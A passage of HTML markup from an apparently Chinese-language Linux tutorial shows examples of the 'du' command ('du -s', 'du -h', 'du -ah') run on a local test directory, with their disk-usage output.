&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aceed0978e618136906-15&quot;&gt;15&lt;/div&gt;
&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aceed0978e618136906-1&quot;&gt;
&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;localhost&lt;/span&gt; &lt;span class=&quot;crayon-r&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;# du -s&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aceed0978e618136906-2&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aceed0978e618136906-3&quot;&gt;
&lt;span class=&quot;crayon-cn&quot;&gt;1288&lt;/span&gt;    &lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aceed0978e618136906-4&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aceed0978e618136906-5&quot;&gt;
&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;localhost&lt;/span&gt; &lt;span class=&quot;crayon-r&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;# du -s scf&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aceed0978e618136906-6&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aceed0978e618136906-7&quot;&gt;
&lt;span class=&quot;crayon-cn&quot;&gt;32&lt;/span&gt;      &lt;span class=&quot;crayon-i&quot;&gt;scf&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aceed0978e618136906-8&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aceed0978e618136906-9&quot;&gt;
&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;localhost&lt;/span&gt; &lt;span class=&quot;crayon-r&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;# cd ..&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aceed0978e618136906-10&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aceed0978e618136906-11&quot;&gt;
&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;localhost&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;soft&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;# du -s test&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aceed0978e618136906-12&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aceed0978e618136906-13&quot;&gt;
&lt;span class=&quot;crayon-cn&quot;&gt;1288&lt;/span&gt;    &lt;span class=&quot;crayon-r&quot;&gt;test&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aceed0978e618136906-14&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aceed0978e618136906-15&quot;&gt;
&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;localhost&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;soft&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;#&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0013 seconds] --&gt;
&lt;p&gt;说明：&lt;/p&gt;
&lt;p&gt;实例6：方便阅读的格式显示&lt;/p&gt;
&lt;p&gt;命令：&lt;/p&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

		&lt;div id=&quot;crayon-587aceed09792157227072&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate&quot; data-settings=&quot; minimize scroll-always&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-copy-button&quot; title=&quot;复制代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;span class=&quot;crayon-language&quot;&gt;Shell&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;
			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; readonly style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
du -h test&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
					&lt;tr class=&quot;crayon-row&quot;&gt;
				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aceed09792157227072-1&quot;&gt;1&lt;/div&gt;&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aceed09792157227072-1&quot;&gt;
&lt;span class=&quot;crayon-r&quot;&gt;du&lt;/span&gt; &lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;h&lt;/span&gt; &lt;span class=&quot;crayon-r&quot;&gt;test&lt;/span&gt;
&lt;/div&gt;&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0004 seconds] --&gt;
&lt;p&gt;输出：&lt;/p&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

		&lt;div id=&quot;crayon-587aceed09795156139488&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate&quot; data-settings=&quot; minimize scroll-always&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-copy-button&quot; title=&quot;复制代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;span class=&quot;crayon-language&quot;&gt;Shell&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;
			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; readonly style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
[root@localhost soft]# du -h test

608K    test/test6

308K    test/test4

4.0K    test/scf/lib

4.0K    test/scf/service/deploy/product

4.0K    test/scf/service/deploy/info

12K     test/scf/service/deploy

16K     test/scf/service

4.0K    test/scf/doc

4.0K    test/scf/bin

32K     test/scf

8.0K    test/test3

1.3M    test

[root@localhost soft]#&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
					&lt;tr class=&quot;crayon-row&quot;&gt;
				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aceed09795156139488-1&quot;&gt;1&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aceed09795156139488-2&quot;&gt;2&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aceed09795156139488-3&quot;&gt;3&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aceed09795156139488-4&quot;&gt;4&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aceed09795156139488-5&quot;&gt;5&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aceed09795156139488-6&quot;&gt;6&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aceed09795156139488-7&quot;&gt;7&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aceed09795156139488-8&quot;&gt;8&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aceed09795156139488-9&quot;&gt;9&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aceed09795156139488-10&quot;&gt;10&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aceed09795156139488-11&quot;&gt;11&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aceed09795156139488-12&quot;&gt;12&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aceed09795156139488-13&quot;&gt;13&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aceed09795156139488-14&quot;&gt;14&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aceed09795156139488-15&quot;&gt;15&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aceed09795156139488-16&quot;&gt;16&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aceed09795156139488-17&quot;&gt;17&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aceed09795156139488-18&quot;&gt;18&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aceed09795156139488-19&quot;&gt;19&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aceed09795156139488-20&quot;&gt;20&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aceed09795156139488-21&quot;&gt;21&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aceed09795156139488-22&quot;&gt;22&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aceed09795156139488-23&quot;&gt;23&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aceed09795156139488-24&quot;&gt;24&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aceed09795156139488-25&quot;&gt;25&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aceed09795156139488-26&quot;&gt;26&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aceed09795156139488-27&quot;&gt;27&lt;/div&gt;
&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aceed09795156139488-1&quot;&gt;
&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;localhost&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;soft&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;# du -h test&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aceed09795156139488-2&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aceed09795156139488-3&quot;&gt;
&lt;span class=&quot;crayon-cn&quot;&gt;608K&lt;/span&gt;    &lt;span class=&quot;crayon-r&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;test6&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aceed09795156139488-4&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aceed09795156139488-5&quot;&gt;
&lt;span class=&quot;crayon-cn&quot;&gt;308K&lt;/span&gt;    &lt;span class=&quot;crayon-r&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;test4&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aceed09795156139488-6&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aceed09795156139488-7&quot;&gt;
&lt;span class=&quot;crayon-cn&quot;&gt;4.0K&lt;/span&gt;    &lt;span class=&quot;crayon-r&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;scf&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;lib&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aceed09795156139488-8&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aceed09795156139488-9&quot;&gt;
&lt;span class=&quot;crayon-cn&quot;&gt;4.0K&lt;/span&gt;    &lt;span class=&quot;crayon-r&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;scf&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;service&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;deploy&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;product&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aceed09795156139488-10&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aceed09795156139488-11&quot;&gt;
&lt;span class=&quot;crayon-cn&quot;&gt;4.0K&lt;/span&gt;    &lt;span class=&quot;crayon-r&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;scf&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;service&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;deploy&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;info&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aceed09795156139488-12&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aceed09795156139488-13&quot;&gt;
&lt;span class=&quot;crayon-cn&quot;&gt;12K&lt;/span&gt;     &lt;span class=&quot;crayon-r&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;scf&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;service&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;deploy&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aceed09795156139488-14&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aceed09795156139488-15&quot;&gt;
&lt;span class=&quot;crayon-cn&quot;&gt;16K&lt;/span&gt;     &lt;span class=&quot;crayon-r&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;scf&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;service&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aceed09795156139488-16&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aceed09795156139488-17&quot;&gt;
&lt;span class=&quot;crayon-cn&quot;&gt;4.0K&lt;/span&gt;    &lt;span class=&quot;crayon-r&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;scf&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;doc&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aceed09795156139488-18&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aceed09795156139488-19&quot;&gt;
&lt;span class=&quot;crayon-cn&quot;&gt;4.0K&lt;/span&gt;    &lt;span class=&quot;crayon-r&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;scf&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;bin&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aceed09795156139488-20&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aceed09795156139488-21&quot;&gt;
&lt;span class=&quot;crayon-cn&quot;&gt;32K&lt;/span&gt;     &lt;span class=&quot;crayon-r&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;scf&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aceed09795156139488-22&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aceed09795156139488-23&quot;&gt;
&lt;span class=&quot;crayon-cn&quot;&gt;8.0K&lt;/span&gt;    &lt;span class=&quot;crayon-r&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;test3&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aceed09795156139488-24&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aceed09795156139488-25&quot;&gt;
&lt;span class=&quot;crayon-cn&quot;&gt;1.3M&lt;/span&gt;    &lt;span class=&quot;crayon-r&quot;&gt;test&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aceed09795156139488-26&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aceed09795156139488-27&quot;&gt;
&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;localhost&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;soft&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;#&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0027 seconds] --&gt;
&lt;p&gt;说明：&lt;/p&gt;
&lt;p&gt;实例7：文件和目录都显示&lt;/p&gt;
&lt;p&gt;命令：&lt;/p&gt;
&lt;p&gt;输出：&lt;/p&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

		&lt;div id=&quot;crayon-587aceed09798866655037&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate&quot; data-settings=&quot; minimize scroll-always&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-copy-button&quot; title=&quot;复制代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;span class=&quot;crayon-language&quot;&gt;Shell&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;
			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; readonly style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
[root@localhost soft]# du -ah test

4.0K    test/log31.tar.gz

4.0K    test/test13.tar.gz

0       test/linklog.log

0       test/test6/log2014.log

300K    test/test6/linklog.log

0       test/test6/log2015.log

4.0K    test/test6/log2013.log

300K    test/test6/log2012.log

0       test/test6/log2017.log

0       test/test6/log2016.log

608K    test/test6

0       test/log2015.log

0       test/test4/log2014.log

4.0K    test/test4/log2013.log

300K    test/test4/log2012.log

308K    test/test4

4.0K    test/scf/lib

4.0K    test/scf/service/deploy/product

4.0K    test/scf/service/deploy/info

12K     test/scf/service/deploy

16K     test/scf/service

4.0K    test/scf/doc

